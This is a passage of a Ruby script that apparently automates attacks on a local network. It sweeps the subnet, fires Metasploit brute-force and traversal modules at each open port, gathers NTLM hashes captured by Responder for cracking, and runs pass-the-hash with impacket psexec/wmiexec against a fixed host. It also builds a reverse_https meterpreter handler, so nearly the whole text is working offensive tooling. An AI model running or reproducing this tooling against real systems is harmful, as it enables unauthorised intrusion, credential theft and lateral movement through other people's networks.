			exploitList << "use auxiliary/scanner/misc/redis_server"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==8000
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/admin/http/hp_web_jetadmin_exec"
			exploitList << "use auxiliary/scanner/http/barracuda_directory_traversal"
			exploitList << "use auxiliary/scanner/http/splunk_web_login"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
			
		end
		if port==8222
			puts "nmap --script http-vmware-path-vuln -p80,443,8222,8333 -iL hosts_port80.txt"
		end
		if port==8333
			puts "nmap --script http-vmware-path-vuln -p80,443,8222,8333 -iL hosts_port80.txt"
		end
		if port==8161
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/http/apache_activemq_source_disclosure"
			exploitList << "use auxiliary/scanner/http/apache_activemq_traversal"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==8222
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_login"
			exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_ping"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==8834
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []														
			exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_login"
			exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_ping"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==9000
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/admin/http/axigen_file_access"
			exploitList << "use auxiliary/scanner/misc/raysharp_dvr_passwords"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==9084
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/http/vmware_update_manager_traversal"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end	
		if port==9100
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/printer/printer_download_file"
			exploitList << "use auxiliary/scanner/printer/printer_env_vars"
			exploitList << "use auxiliary/scanner/printer/printer_list_dir"
			exploitList << "use auxiliary/scanner/printer/printer_list_volumes"
			exploitList << "use auxiliary/scanner/printer/printer_ready_message"
			exploitList << "use auxiliary/scanner/printer/printer_version_info"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==9200
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/elasticsearch/indeces_enum"
			exploitList << "use auxiliary/scanner/elasticsearch/indices_enum"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==10001	
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/admin/zend/java_bridge"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==11211
			puts "nmap -p 11211 --script membase-brute -iL hosts_port11211.txt"
		end
		if port==13364
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/scanner/misc/rosewill_rxs3211_passwords"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==17185
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/scanner/vxworks/wdbrpc_bootline"
			exploitList << "use auxiliary/scanner/vxworks/wdbrpc_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end

		end
		if port==27017	
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/mongodb/mongodb_login"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end			
		end
		if port==32764
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/scanner/misc/sercomm_backdoor_scanner"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end

		end

		if port==49152
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []									
			exploitList << "use auxiliary/scanner/http/smt_ipmi_49152_exposure"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
			
		end
		if port==50000	
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []									
			exploitList << "use auxiliary/scanner/db2/db2_auth"
			exploitList << "use auxiliary/scanner/db2/db2_version"
			exploitList << "use auxiliary/scanner/db2/discovery"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end

		end

		if port==50013
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []						
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_abaplog"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_brute_login"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_extractusers"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getenv"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getlogfiles"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getprocesslist"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_instanceproperties"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_listlogfiles"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_startprofile"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
	end
end

def runSMB(ipAddr)
	print Color.green,Color.bold,'[*] Runs msf_smb_version against: '+ipAddr,Color.clear,"\n"
	cmd = "use auxiliary/scanner/smb/smb_version\nset rhosts "+ipAddr+"\nrun\n"
	results = runMetasploit(cmd)
	resultsLine = results.split("\n")
	count=0
	for x in resultsLine
		if x.include? "is running"
			#puts x
			print Color.green,Color.bold,x,Color.clear,"\n"
		end	
		count+=1
	end				

	puts
	print Color.green,Color.bold,'[*] Runs enum4linux against: '+ipAddr,Color.clear,"\n"
	cmd = 'enum4linux -A '+ipAddr
        output = run_cmd(cmd)
	puts
	print Color.green,Color.bold,'[*] Runs smbclient against: '+ipAddr,Color.clear,"\n"
	cmd = 'smbclient -L //'+ipAddr+' -N -U ""'
        output = run_cmd(cmd)
	puts output
end	

def run_cmd(cmd)
    stdin, stdout, stderr = Open3.popen3(cmd)
    return stdout.readlines
end

def timeout_cmd(command,timeout)
    cmd_output = []
    begin
        status = Timeout.timeout(timeout) do
            p = IO.popen(command) do |f|
                f.each_line do |g| 
                    cmd_output << g 
                end
            end
        end
	return cmd_output
    rescue Timeout::Error
	#puts "Timeout: "+command
        return cmd_output
    end
end

def mask_2_ciddr(mask)
   return "/" + mask.split(".").map { |e| e.to_i.to_s(2).rjust(8, "0") }.join.count("1").to_s
end

def chunk(string, size)
    return string.scan(/.{1,#{size}}/)
end

def createDatabase()
	filename = 'database.db'
	if !File.exist?(filename)
	  	db = SQLite3::Database.new( 'database.db' )
 		#db.execute("CREATE TABLE hosts (id INTEGER PRIMARY KEY,macAddr VARCHAR(255), ipAddr VARCHAR(100), nbnsName VARCHAR(100)) ");
  		#db.execute("CREATE TABLE hosts (id INTEGER PRIMARY KEY,macAddr VARCHAR(255), ipAddr VARCHAR(100)) ");
  		begin
		 	db.execute("CREATE TABLE passwords (id INTEGER PRIMARY KEY,ipHost VARCHAR(255), type VARCHAR(100), hash VARCHAR(100), plainText VARCHAR(100), crackStatus VARCHAR(1), runJohn VARCHAR(1)) ");
   			db.execute("CREATE TABLE hosts (id INTEGER PRIMARY KEY,macAddr VARCHAR(255), ipAddr VARCHAR(100), nbnsName VARCHAR(100), runScan VARCHAR(1)) ");
		rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
			db.close
		end
	end
end

def getMacAddress(ipAddr)
	x = PacketFu::ARPPacket.new(:ï¬‚avor => "Windows")
	x.eth_saddr=Mac.addr
	x.eth_daddr="ff:ff:ff:ff:ff:ff"
	x.arp_saddr_ip=local_ip
	x.arp_saddr_mac=Mac.addr 
	x.arp_daddr_ip=ipAddr
	x.arp_daddr_mac="00:00:00:00:00:00"
	x.arp_opcode=1
	x.to_w('eth0') 
end

def runNmap(ipAddr)
	targetIP = ipAddr
	print Color.green,Color.bold,'[*] Runs Nmap against '+targetIP,Color.clear+"\n"
 	filename = 'scan_'+ipAddr+'.xml'
	ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
     	broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'
       	cmd = "/sbin/ifconfig eth0 | awk '/Mask:/{ print $4;} '"
	output = IO.popen(cmd)
	netmask = output.readlines
	netmask = (netmask[0]).gsub("Mask:","").to_s
	netmask = netmask[0..(netmask.size-1)].to_s
	cidr = mask_2_ciddr(netmask)	
	ipRange =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.0'
	if not File.exist?(filename)
		cmd = 'nmap -Pn -sT -n -sV --top-ports 1000 -A -v --script default '+targetIP+' -oX '+filename
		timeout=120
		timeout_cmd(cmd,timeout)
		portListTmp=[]
		Nmap::XML.new(filename) do |xml|
 		 	xml.each_host do |host|
    			puts "[#{host.ip}]"
				host.each_port do |port|
					if port.state!='filtered' and port.state!='closed'
      					puts "  #{port.number}/#{port.protocol}\t#{port.state}\t#{port.service}"
						portListTmp<<port.number
					end
				end
    		end
  		end
		return portListTmp
	else
		portListTmp=[]
		Nmap::XML.new(filename) do |xml|
			xml.each_host do |host|
    				#puts "[#{host.ip}]"
				host.each_port do |port|
					if port.state!='filtered' and port.state!='closed'
	     				puts "  #{port.number}/#{port.protocol}\t#{port.state}\t#{port.service}"
						portListTmp<<port.number
					end
    			end
  			end
		end
		return portListTmp
	end
end

def findHosts()
	loop{
	       	ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
       		broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'
        	cmd = "/sbin/ifconfig eth0 | awk '/Mask:/{ print $4;} '"
		output = IO.popen(cmd)
		netmask = output.readlines
		netmask = (netmask[0]).gsub("Mask:","").to_s
		netmask = netmask[0..(netmask.size-1)].to_s
		cidr = mask_2_ciddr(netmask)	
		ipRange =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.0'
   		cidr4 = NetAddr::CIDR.create(ipRange+cidr)
		puts "[*] Finding Hosts: "+ipRange+cidr
		cmd = 'nmap -PR -n -sn '+ipRange+cidr+' -oX arp_scan.xml'
		timeout=15
		timeout_cmd(cmd,timeout)
		#Nmap::XML.new('arp_scan.xml') do |xml|
  		#	xml.each_host do |host|
    		#		puts "[#{host.ip}]"
    		#	end
  		#end
		sleep(60)
	}
end

def findHosts1()
       	ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
        broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'
        cmd = "/sbin/ifconfig eth0 | awk '/Mask:/{ print $4;} '"
	output = IO.popen(cmd)
	netmask = output.readlines
	netmask = (netmask[0]).gsub("Mask:","").to_s
	netmask = netmask[0..(netmask.size-1)].to_s
	cidr = mask_2_ciddr(netmask)	
	ipRange =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.0'
	
   	#puts ipRange+cidr
   	cidr4 = NetAddr::CIDR.create(ipRange+cidr)
	#cidr4 = NetAddr::CIDR.create('172.16.91.0/24')
	puts "[*] Finding Hosts: "+ipRange+cidr
	ipList = cidr4.enumerate()
	#loop{
		#arp-scan 172.16.91.0/24
       	for ip in ipList
		puts ip
		x = PacketFu::ARPPacket.new(:ï¬‚avor => "Windows")
		x.eth_saddr=Mac.addr
		x.eth_daddr="ff:ff:ff:ff:ff:ff"
		x.arp_saddr_ip=local_ip
		x.arp_saddr_mac=Mac.addr 
		x.arp_daddr_ip=ip
		x.arp_daddr_mac="ff:ff:ff:ff:ff:ff"
		x.arp_opcode=1
		x.to_w() 
		#x.to_w('eth0') 
		#puts ip
	end
	#}
end

def crackHash()
	loop{
		print Color.green,Color.bold,'[*] Looking for hashes to crack ...',Color.clear+"\n"
		
		#crackJohn = "/pentest/john/john "+hashFile+" --wordlist="/Volumes/My Passport/Password_Lists/crackstation.txt"
		hashType=[]
		hashType<<"ntlmv1"
		hashType<<"ntlmv2"

		for hash in hashType
			begin
		   	 	db = SQLite3::Database.open "database.db"
				stmt = db.prepare "SELECT hash from passwords WHERE crackStatus=? and type=?"
				stmt.bind_param 1, "0"
				stmt.bind_param 2, hash
				rs = stmt.execute
				rows = rs.next
			rescue SQLite3::Exception => e 
	   	 		puts "Exception occured"
	   	 		puts e
	   	 	ensure
				stmt.close if stmt
	    		db.close if db
			end
			if not rows.nil?
				puts rows
			else
				print Color.green,Color.bold,'[*] Nothing to crack yet ...',Color.clear+"\n"
				#puts "no rows found"
			end
		end
		sleep 30
	}
end	

def watchResponderDir()
	responderPath = "/pentest/Responder/"
	Dir.chdir(responderPath)
	fileList = Dir["*ntlm*.txt"]
	for x in fileList
		puts x
	end

	#Fix bug with SQLite
	begin
    	db = SQLite3::Database.open "database.db"
		stmt = db.prepare "SELECT hash from passwords WHERE hash=?"
		stmt.bind_param 1, "Administrator:500:cd9f3af449b29ec3aad3b435b51404ee:3a792fcf68710cb2edc6a5251cbadcd7:::"
		rs = stmt.execute
		rows = rs.next
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt.close if stmt
    		db.close if db
	end


	begin
	   	db1 = SQLite3::Database.open "database.db"
		if rows.nil?
			stmt1 = db1.prepare "insert into passwords (ipHost,type,hash,crackStatus,runJohn) VALUES (?,?,?,0,0)"
			stmt1.bind_param 1, "127.0.0.1"
			stmt1.bind_param 2, "ntlmv2"
			stmt1.bind_param 3, "Administrator:500:cd9f3af449b29ec3aad3b435b51404ee:3a792fcf68710cb2edc6a5251cbadcd7:::"
			rs1 = stmt1.execute
		end
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt1.close if stmt1
    		db1.close if db1
	end

end

def watchPwdDir()
	impacketPath = "/pentest/impacket-read-only"
	cmd = 'cat /root/.msf4/loot/*'
	output = timeout_cmd(cmd,2)	
	for creds in output
		splitText = creds.split(":")
		username = splitText[0]
		hashes = splitText[2]+':'+splitText[3]
		cmd = 'echo "'+creds+'"| tee -a cmdResult.log'
		output = timeout_cmd(cmd,5)

		cmd = "python "+impacketPath+"/examples/psexec.py -hashes "+hashes+" "+username+"@192.168.117.132 ipconfig | tee -a cmdResult.log"
		output = timeout_cmd(cmd,5)
		found=false
		for line in output
			if line.include?"IP Address"
				puts creds
				found=true
				#puts output
			end
		end
		if found==false
			cmd = "python "+impacketPath+"/examples/wmiexec.py -hashes "+hashes+" "+username+"@192.168.117.132 ipconfig"
			output = timeout_cmd(cmd,5)
			for line in output
				if line.include?"IP Address"
					puts creds
				end
			end
		end
	end
end

def msfHandler()
	cmd = []
	cmd << 'set AutoRunScript multi_console_command -rc '+Dir.pwd+'/post.rc'
	cmd << 'spool '+Dir.pwd+'/msfconsole.log'
	cmd << 'use multi/handler'
	cmd << 'set payload windows/meterpreter/reverse_https'
	cmd << 'set lport 8443'
	cmd << 'set lhost '+local_ip
	cmd << 'set ExitOnSession false'
	cmd << 'set exitfunc thread'
	cmd << 'exploit -j'
	filename = "handler.rc"
	newLn = "\n"
	f = File.new(filename, "w")
	for text in cmd
		f.write(text+newLn)
	end
	#Start new session
	#run ./msfconsole -r handler.rc
end
	
def prepareMsfResource(host,portList)
	filename = "tasks_"<<host+".rc"
	puts filename
	f = File.new(filename, "w")

	postText = []
	postText << '		for exp in exploitList'
	postText << '			self.run_single(exp)'
	postText << '			hosts.each do |net|'
	postText <<	'				self.run_single("set RHOSTS #{net}")'
	postText << ' 				self.run_single("set RHOST #{net}")'
	postText << ' 				self.run_single("exploit")'
	postText << '			end'
	postText << '		end'

	resourceText=[]
	resourceText<<'<ruby>'
	resourceText<<'hosts = []'
	resourceText<<'hosts << "'+host +'"'
	resourceText << 'self.run_single("spool msfconsole.log")'
	resourceText << 'self.run_single("setg VERBOSE true")'
	resourceText << 'self.run_single("setg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt")'
	resourceText << 'self.run_single("setg USERNAME root")'
	resourceText << 'self.run_single("setg USER_AS_PASS true")'

	resourceText<<'ports = []'
	for port in portList
		resourceText << "ports << "+ port.to_s
	end
	resourceText << 'for port in ports'
	for port in portList	
=begin
		if port==22
			resourceText << '	if port==22'
			resourceText << '		exploitList = []'
			resourceText << '		exploitList << "use auxiliary/scanner/ssh/cerberus_sftp_enumusers"'
			resourceText << '		for exp in exploitList'
			resourceText << '			self.run_single(exp)'
			resourceText << '			hosts.each do |net|'
			resourceText <<	'				self.run_single("set RHOSTS #{net}")'
			resourceText << ' 				self.run_single("set RHOST #{net}")'
			resourceText << ' 				self.run_single("exploit")'
			resourceText << '			end'
			resourceText << '		end'
			resourceText << '	end'
		end
=end

		if port==22
			resourceText << '	if port==22'
			resourceText << '		exploitList = []'
			resourceText << '		exploitList << "use auxiliary/scanner/ssh/cerberus_sftp_enumusers"'
			resourceText << '		exploitList << "use auxiliary/scanner/ssh/ssh_enumusers"'
			resourceText << '		exploitList << "use auxiliary/scanner/ssh/ssh_identify_pubkeys"'
			resourceText << '		exploitList << "use auxiliary/scanner/ssh/ssh_login"'
			resourceText << '		exploitList << "use auxiliary/scanner/ssh/ssh_login_pubkey"'
			resourceText << '		exploitList << "use auxiliary/scanner/ssh/ssh_version"'
			resourceText << '		for exp in exploitList'
			resourceText << '			self.run_single(exp)'
			resourceText << '			hosts.each do |net|'
			resourceText <<	'				self.run_single("set RHOSTS #{net}")'
			resourceText << ' 				self.run_single("set RHOST #{net}")'
			resourceText << ' 				self.run_single("exploit")'
			resourceText << '			end'
			resourceText << '		end'
			resourceText << '	end'
		end
		if port==80 or port==443 or port==8080
			resourceText << '	if port==80 or port==443 or port==8080'
			resourceText << '		exploitList = []'
			resourceText << '		exploitList << "use auxiliary/scanner/http/backup_file"'
			resourceText << '		exploitList << "use auxiliary/scanner/http/brute_dirs"'
			resourceText << '		exploitList << "use auxiliary/scanner/http/dir_scanner"'
			resourceText << '		exploitList << "use auxiliary/scanner/http/dir_webdav_unicode_bypass"'
			resourceText << '		exploitList << "use auxiliary/scanner/http/nginx_source_disclosure"'
			resourceText << '		for exp in exploitList'
			resourceText << '			self.run_single(exp)'
			resourceText << '			hosts.each do |net|'
			resourceText <<	'				self.run_single("set RHOSTS #{net}")'
			resourceText << ' 				self.run_single("set RHOST #{net}")'
			resourceText << ' 				self.run_single("exploit")'
			resourceText << '			end'
			resourceText << '		end'
			resourceText << '	end'
		end

		if port==443
			resourceText << '	if port==443'
			resourceText << '		self.run_single("setg SSL true")'
			resourceText << '		exploitList = []'
			resourceText << '		exploitList << "use auxiliary/scanner/http/tomcat_enum"'
			resourceText << '		exploitList << "use auxiliary/scanner/http/tomcat_mgr_login"'
			for x in postText
				resourceText << x
			end
		end

		if port==445
			resourceText << '	if port==445'
			resourceText << '		exploitList = []'
			resourceText << '		exploitList << "use auxiliary/scanner/smb/smb_version"'
			resourceText << '		for exp in exploitList'
			resourceText << '			self.run_single(exp)'
			resourceText << '			hosts.each do |net|'
			resourceText <<	'				self.run_single("set RHOSTS #{net}")'
			resourceText << ' 				self.run_single("set RHOST #{net}")'
			resourceText << ' 				self.run_single("exploit")'
			resourceText << '			end'
			resourceText << '		end'
			resourceText << '	end'
		end

		#resourceText << newLn
	end
	resourceText << 'end'
	resourceText << 'self.run_single("exit")'
	newLn = "\n"
	for text in resourceText
		f.write(text+newLn)
	end
	f.close
	cmd = "/pentest/metasploit-framework/msfconsole -r "+filename
	
	begin
	   	db1 = SQLite3::Database.open "database.db"
		stmt1 = db1.prepare "update hosts set runScan=1 where ipAddr=?"
		stmt1.bind_param 1, host
		rs1 = stmt1.execute
	rescue SQLite3::Exception => e 
    	puts "Exception occured"
    	puts e
    ensure
		stmt1.close if stmt1
    	db1.close if db1
    end
	

	output = timeout_cmd(cmd,30)
	for line in output
		if line.include?"[*]"
			puts line
		end
	end
=begin
		if port=="80" or port=="443" or port=="8080"
			exploitList << "use auxiliary/scanner/http/backup_file"
			exploitList << "use auxiliary/scanner/http/brute_dirs"
			exploitList << "use auxiliary/scanner/http/dir_scanner"
			exploitList << "use auxiliary/scanner/http/dir_webdav_unicode_bypass"
			exploitList << "use auxiliary/scanner/http/nginx_source_disclosure"
		end
		if port=="443"
			self.run_single("setg SSL true")
			puts "nmap --script ssl-known-key -p 443 -iL hosts_port443.txt"
			exploitList << "use auxiliary/scanner/http/tomcat_enum"
			exploitList << "use auxiliary/scanner/http/tomcat_mgr_login"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="8080"
			exploitList << "use auxiliary/scanner/http/jboss_status"
			exploitList << "use auxiliary/scanner/http/jboss_vulnscan"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="445"
			puts "nmap --script smb-brute.nse -p445 -iL hosts_port445.txt"
		end
		if port=="512"
			exploitList << "use auxiliary/scanner/rservices/rexec_login"
			exploitList << "use auxiliary/scanner/rservices/rlogin_login"
			exploitList << "use auxiliary/scanner/rservices/rsh_login"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end

		end
		if port=="513"
			puts "nmap -p 513 --script rlogin-brute -iL hosts_port513.txt"
		end
		if port=="548"
			exploitList << "auxiliary/scanner/afp/afp_login"
	   		exploitList << "auxiliary/scanner/afp/afp_server_info"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="1098"
			puts "nmap --script rmi-dumpregistry.nse -p 1098 -iL hosts_port1098.txt"
		end
		if port=="1099"
